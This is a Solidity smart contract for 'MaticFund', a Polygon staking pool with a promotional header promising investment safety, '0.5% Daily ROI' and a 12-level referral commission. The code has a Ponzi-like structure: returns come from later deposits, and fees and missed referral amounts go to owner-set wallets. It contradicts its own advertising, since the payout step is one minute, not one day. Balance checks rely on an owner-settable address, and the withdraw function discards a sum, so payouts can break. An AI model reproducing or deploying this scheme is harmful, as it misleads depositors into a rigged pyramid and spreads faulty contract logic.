/*   Explore this smart contract designed entirely in a decentralized manner, ensuring the safety of your investments.
 *
 *              Website: https://maticfund.com
 *               MATICFUND SMART CONTRACT
 *                    IS HERE TO STAY!
 *
 *         Build from the Community for the Community. We support MATIC.
 *
 *	 	       0.5% Daily ROI + 0.5% HOLD BONUS
 *
 *     			      [USAGE INSTRUCTION]
 *
 *  1) Connect Polygon with (METAMASK) browser extension MetaMask , or Mobile Wallet Apps like Trust Wallet
 *  2) Ask your sponsor for Referral link and stake to the contract.
 *
 *   [AFFILIATE PROGRAM]
 *
 *    22% in  12-level Referral Commission: 10% - 2% - 1% - 1% - 1% - 1% - 1% - 1% - 1% - 1% - 1% - 1%
 *
 *  [DISCLAIMER]: This is an experimental community project, which means this project has high risks and high rewards.
 *   Once the contract balance drops to zero, all the payments will stop immediately. This project is decentralized and therefore it belongs to the community.
 *   Make a deposit at your own risk.
 *
 */

//SPDX-License-Identifier: MIT
pragma solidity 0.8.22;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
}

contract MaticFund {
    using SafeMath for uint256;
    uint256 public constant DEPOSITS_MAX = 3e2;
    uint256 public constant INVEST_MIN_AMOUNT = 1 ether;
    uint256 public constant INVEST_MAX_AMOUNT = 1e6 ether;
    address public owner;
    uint256 public constant MARKETING_FEE = 6e2;
    uint256 public constant PROJECT_FEE = 6e2;
    uint256 public constant Dev_Fee = 1e2;
    uint256 public constant MAX_HOLD_PERCENT = 5e1;
    uint256 public constant PERCENTS_DIVIDER = 1e4;
    uint256 public constant TIME_STEP = 1 minutes;
    address payable public marketingAddress;
    address payable public projectAddress;
    address payable public devAdress;
    address payable public defaultAddress;
    address payable public nAddress1;
    address payable public nAddress2;
    uint256 public totalInvestAmount;
    uint256 public totalInvestCount;
    uint256 public totalWithdrawn;
    uint256 public contractPercent = 5e1;
    uint256 public contractCreationTime;
    address public contractAddress;

    struct ReferralRules {
        uint256 percent;
        uint256 requiredAmount;
        uint24 requiredFirstLineCount;
    }

    ReferralRules[] _NECESSARIES;
    struct Deposit {
        uint256 amount;
        uint256 withdrawn;
        uint256 start;
    }
    struct User {
        Deposit[] deposits;
        uint256 checkpoint;
        address referrer;
        uint256 bonus;
        uint256 totalDepositAmount;
        uint256 totalMissedAmount;
        uint256 totalTeamInvest;
        uint24[12] refs;
        uint24 firstLineCount;
    }
    mapping(address => User) internal users;
    mapping(address => address) public uplinePartners;

    event Newbie(address user);
    event NewDeposit(address indexed user, uint amount);
    event Withdrawn(address indexed user, uint amount);
    event RefBonus(
        address indexed referrer,
        address indexed referral,
        uint indexed level,
        uint amount
    );
    event RefBonusMissed(
        address indexed referrer,
        address indexed referral,
        uint indexed level,
        uint amount
    );
    event RefBack(
        address indexed referrer,
        address indexed referral,
        uint amount
    );
    event FeePayed(address indexed user, uint totalAmount);
    event UplinePartnerSet(
        address indexed walletAddress,
        address indexed uplinePartner
    );

    ReferralRules[12] NECESSARIES;

    constructor(
        address payable marketingAddr,
        address payable projectAddr,
        address payable devAddr,
        address payable _defaultAdress,
        address payable _nAddress1,
        address payable _nAddress2
    ) {
        marketingAddress = marketingAddr;
        projectAddress = projectAddr;
        devAdress = devAddr;
        contractCreationTime = block.timestamp;
        defaultAddress = _defaultAdress;
        nAddress1 = _nAddress1;
        nAddress2 = _nAddress2;
        owner = msg.sender;
        NECESSARIES[0] = ReferralRules(1e3, 1e18, 0);
        NECESSARIES[1] = ReferralRules(2e2, 5e19, 1);
        NECESSARIES[2] = ReferralRules(1e2, 1e20, 1);
        NECESSARIES[3] = ReferralRules(1e2, 1e20, 1);
        NECESSARIES[4] = ReferralRules(1e2, 1e20, 1);
        NECESSARIES[5] = ReferralRules(1e2, 2e20, 6);
        NECESSARIES[6] = ReferralRules(1e2, 3e20, 7);
        NECESSARIES[7] = ReferralRules(1e2, 5e20, 8);
        NECESSARIES[8] = ReferralRules(1e2, 75e19, 9);
        NECESSARIES[9] = ReferralRules(1e2, 75e19, 10);
        NECESSARIES[10] = ReferralRules(1e2, 1e21, 11);
        NECESSARIES[11] = ReferralRules(1e2, 1e21, 12);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner can call this function.");
        _;
    }

    function getContractBalance() public view returns (uint256) {
        return contractAddress.balance;
    }

    function withdraw() public {
        User storage user = users[msg.sender];
        uint256 userPercentRate = getUserPercentRate(msg.sender);
        uint256 totalAmount;
        uint256 dividends;
        uint256 contractBalance = contractAddress.balance;
        uint32 multiplier = 2;

        if (contractBalance < uint256(totalInvestAmount.mul(5).div(1e2))) {
            multiplier = 1;
        }

        for (uint256 i = 0; i < user.deposits.length; i++) {
            if (
                uint256(user.deposits[i].withdrawn) <
                uint256(user.deposits[i].amount).mul(multiplier)
            ) {
                if (user.deposits[i].start > user.checkpoint) {
                    dividends = (
                        uint256(user.deposits[i].amount)
                            .mul(userPercentRate)
                            .div(PERCENTS_DIVIDER)
                    )
                        .mul(
                            block.timestamp.sub(uint256(user.deposits[i].start))
                        )
                        .div(TIME_STEP);
                } else {
                    dividends = (
                        uint256(user.deposits[i].amount)
                            .mul(userPercentRate)
                            .div(PERCENTS_DIVIDER)
                    ).mul(block.timestamp.sub(uint256(user.checkpoint))).div(
                            TIME_STEP
                        );
                }

                if (
                    uint256(user.deposits[i].withdrawn).add(dividends) >
                    uint256(user.deposits[i].amount).mul(multiplier)
                ) {
                    dividends = (
                        uint256(user.deposits[i].amount).mul(multiplier)
                    ).sub(uint256(user.deposits[i].withdrawn));
                }

                if (totalAmount.add(dividends) <= contractBalance.div(10)) {
                    user.deposits[i].withdrawn = uint256(
                        uint256(user.deposits[i].withdrawn).add(dividends)
                    );
                    totalAmount.add(dividends);
                } else {
                    user.deposits[i].withdrawn = uint256(
                        uint256(user.deposits[i].withdrawn)
                            .add(contractBalance.div(10))
                            .sub(totalAmount)
                    );
                    totalAmount = contractBalance.div(10);
                    break;
                }
            }
        }
        require(totalAmount > 0, "User has no dividends");
        user.checkpoint = uint256(block.timestamp);
        payable(msg.sender).transfer(totalAmount);
        totalWithdrawn = totalWithdrawn.add(totalAmount);
        emit Withdrawn(msg.sender, totalAmount);
    }

    function getUserPercentRate(
        address userAddress
    ) private view returns (uint256) {
        User storage user = users[userAddress];

        if (isActive(userAddress)) {
            uint256 timeMultiplier = (
                block.timestamp.sub(uint256(user.checkpoint))
            ).div(TIME_STEP).mul(5);
            if (timeMultiplier > MAX_HOLD_PERCENT) {
                timeMultiplier = MAX_HOLD_PERCENT;
            }
            return contractPercent.add(timeMultiplier);
        } else {
            return contractPercent;
        }
    }

    function getUserAvailable(
        address userAddress
    ) private view returns (uint256) {
        User storage user = users[userAddress];

        uint256 userPercentRate = getUserPercentRate(userAddress);

        uint256 totalDividends;
        uint256 dividends;

        for (uint256 i = 0; i < user.deposits.length; i++) {
            if (
                uint256(user.deposits[i].withdrawn) <
                uint256(user.deposits[i].amount).mul(2)
            ) {
                if (user.deposits[i].start > user.checkpoint) {
                    dividends = (
                        uint256(user.deposits[i].amount)
                            .mul(userPercentRate)
                            .div(PERCENTS_DIVIDER)
                    )
                        .mul(
                            block.timestamp.sub(uint256(user.deposits[i].start))
                        )
                        .div(TIME_STEP);
                } else {
                    dividends = (
                        uint256(user.deposits[i].amount)
                            .mul(userPercentRate)
                            .div(PERCENTS_DIVIDER)
                    ).mul(block.timestamp.sub(uint256(user.checkpoint))).div(
                            TIME_STEP
                        );
                }

                if (
                    uint256(user.deposits[i].withdrawn).add(dividends) >
                    uint256(user.deposits[i].amount).mul(2)
                ) {
                    dividends = (uint256(user.deposits[i].amount).mul(2)).sub(
                        uint256(user.deposits[i].withdrawn)
                    );
                }

                totalDividends = totalDividends.add(dividends);
            }
        }

        return totalDividends;
    }

    function setUplinePartner(address uplinePartner) private {
        address walletAddress = msg.sender;
        if (uplinePartner == address(0)) {
            uplinePartner = defaultAddress;
        }
        require(
            walletAddress != uplinePartner,
            "Cannot set self as upline partner"
        );
        require(
            uplinePartners[walletAddress] == address(0),
            "Upline partner already set"
        );

        uplinePartners[walletAddress] = uplinePartner;
        emit UplinePartnerSet(walletAddress, uplinePartner);
    }

    function getUplinePartner() public view returns (address) {
        return uplinePartners[msg.sender];
    }

    function invest(address payable userRefAddress) public payable {
        address payable referrer;
        uint256 _amount = msg.value;

        address upline = getUplinePartner();
        if (upline == address(0)) {
            referrer = userRefAddress;
            setUplinePartner(userRefAddress);
        } else {
            referrer = payable(upline);
        }

        require(msg.sender == tx.origin, "tx origin = msg.sender");
        require(
            _amount >= INVEST_MIN_AMOUNT && _amount <= INVEST_MAX_AMOUNT,
            "the amount must ve between min and max amounts"
        );

        User storage user = users[msg.sender];

        require(
            user.deposits.length < DEPOSITS_MAX,
            "Maximum 300 deposits from address"
        );

        uint256 marketingFee = _amount.mul(MARKETING_FEE).div(PERCENTS_DIVIDER);
        uint256 projectFee = _amount.mul(PROJECT_FEE).div(PERCENTS_DIVIDER);
        uint256 devfee = _amount.mul(Dev_Fee).div(PERCENTS_DIVIDER);
        marketingAddress.transfer(marketingFee);
        projectAddress.transfer(projectFee);
        devAdress.transfer(devfee);
        emit FeePayed(msg.sender, marketingFee.add(projectFee).add(devfee));

        uint256 missedAmount = 0;

        if (
            user.referrer == address(0) &&
            users[referrer].deposits.length > 0 &&
            referrer != msg.sender
        ) {
            user.referrer = referrer;
        }

        if (user.referrer == defaultAddress) {
            missedAmount = _amount.mul(22).div(100);
        } else {
            for (uint256 i = 0; i < 12; i++) {
                uint256 amount = _amount.mul(NECESSARIES[i].percent).div(
                    PERCENTS_DIVIDER
                );
                if (referrer != address(0) && amount > 0) {
                    if (
                        users[referrer].totalDepositAmount >=
                        NECESSARIES[i].requiredAmount &&
                        users[referrer].firstLineCount >=
                        NECESSARIES[i].requiredFirstLineCount
                    ) {
                        referrer.transfer(amount);
                        users[referrer].bonus = uint256(
                            uint256(users[referrer].bonus).add(amount)
                        );
                        emit RefBonus(referrer, msg.sender, i, amount);
                    } else {
                        missedAmount += amount;
                        users[referrer].totalMissedAmount += amount;

                        emit RefBonusMissed(referrer, msg.sender, i, amount);
                    }
                    users[referrer].refs[i] += 1;
                    users[referrer].totalTeamInvest += _amount;
                    referrer = payable(users[referrer].referrer);
                } else {
                    missedAmount += amount;
                }
            }
        }

        if (missedAmount > 0) {
            uint256 sendingAmount = missedAmount.div(2);
            nAddress1.transfer(sendingAmount);
            nAddress2.transfer(sendingAmount);
        }

        if (user.deposits.length == 0) {
            user.checkpoint = uint256(block.timestamp);
            users[user.referrer].firstLineCount += 1;
            emit Newbie(msg.sender);
        }

        user.deposits.push(
            Deposit(uint256(_amount), 0, uint256(block.timestamp))
        );
        user.totalDepositAmount += uint256(_amount);

        totalInvestAmount += uint256(_amount);
        totalInvestCount++;

        emit NewDeposit(msg.sender, _amount);
    }

    function isActive(address userAddress) public view returns (bool) {
        User storage user = users[userAddress];

        return
            (user.deposits.length > 0) &&
            uint256(user.deposits[user.deposits.length - 1].withdrawn) <
            uint256(user.deposits[user.deposits.length - 1].amount).mul(2);
    }

    function getTotalMissedAmount(
        address userAddress
    ) public view returns (uint256) {
        return users[userAddress].totalMissedAmount;
    }

    function getTotalDepositAmount(
        address userAddress
    ) public view returns (uint256) {
        return users[userAddress].totalDepositAmount;
    }

    function getUserCountOfDeposits(
        address userAddress
    ) private view returns (uint256) {
        return users[userAddress].deposits.length;
    }

    function getUserLastDeposit(
        address userAddress
    ) public view returns (uint256) {
        User storage user = users[userAddress];
        return user.checkpoint;
    }

    function getUserTotalDeposits(
        address userAddress
    ) private view returns (uint256) {
        User storage user = users[userAddress];

        uint256 amount;

        for (uint256 i = 0; i < user.deposits.length; i++) {
            amount = amount.add(uint256(user.deposits[i].amount));
        }

        return amount;
    }

    function getUserTotalWithdrawn(
        address userAddress
    ) private view returns (uint256) {
        User storage user = users[userAddress];

        uint256 amount = user.bonus;

        for (uint256 i = 0; i < user.deposits.length; i++) {
            amount = amount.add(uint256(user.deposits[i].withdrawn));
        }

        return amount;
    }

    function getUserDeposits(
        address userAddress,
        uint256 last,
        uint256 first
    )
        public
        view
        returns (
            uint256[] memory,
            uint256[] memory,
            uint256[] memory,
            uint256[] memory
        )
    {
        User storage user = users[userAddress];

        uint256 count = first.sub(last);
        if (count > user.deposits.length) {
            count = user.deposits.length;
        }

        uint256[] memory amount = new uint256[](count);
        uint256[] memory withdrawn = new uint256[](count);
        uint256[] memory refback = new uint256[](count);
        uint256[] memory start = new uint256[](count);

        uint256 index = 0;
        for (uint256 i = first; i > last; i--) {
            amount[index] = uint256(user.deposits[i - 1].amount);
            withdrawn[index] = uint256(user.deposits[i - 1].withdrawn);
            start[index] = uint256(user.deposits[i - 1].start);
            index++;
        }

        return (amount, withdrawn, refback, start);
    }

    function getSiteStats()
        public
        view
        returns (uint256, uint256, uint256, uint256)
    {
        return (
            totalInvestAmount,
            totalInvestCount,
            contractAddress.balance,
            contractPercent
        );
    }

    function getUserRefCount(
        address userAddress
    ) private view returns (uint256) {
        uint256 totalCount = 0;
        for (uint24 i = 0; i < users[userAddress].refs.length; i++) {
            totalCount += users[userAddress].refs[i];
        }
        return totalCount;
    }

    function getuserTotalTeamInvest(
        address userAddress
    ) private view returns (uint256) {
        return users[userAddress].totalTeamInvest;
    }

    function getUserStats(
        address userAddress
    )
        public
        view
        returns (uint256, uint256, uint256, uint256, uint256, uint256, uint256)
    {
        uint256 userPercentageRate = getUserPercentRate(userAddress);
        uint256 userAvailable = getUserAvailable(userAddress);
        uint256 userTotalDeposit = getUserTotalDeposits(userAddress);
        uint256 userDeposits = getUserCountOfDeposits(userAddress);
        uint256 userWithdrawn = getUserTotalWithdrawn(userAddress);
        uint256 userTotalRefCount = getUserRefCount(userAddress);
        uint256 userTotalTeamInvest = getuserTotalTeamInvest(userAddress);
        return (
            userPercentageRate,
            userAvailable,
            userTotalDeposit,
            userDeposits,
            userWithdrawn,
            userTotalRefCount,
            userTotalTeamInvest
        );
    }

    function getUserReferralsStats(
        address userAddress
    ) public view returns (address, uint256, uint24[12] memory) {
        User storage user = users[userAddress];

        return (user.referrer, user.bonus, user.refs);
    }

    function isContract(address addr) internal view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(addr)
        }
        return size > 0;
    }

    function setContractAddress(address addr) public onlyOwner {
        contractAddress = payable(addr);
    }

    function getContractAddress() public view returns (address) {
        return contractAddress;
    }
}
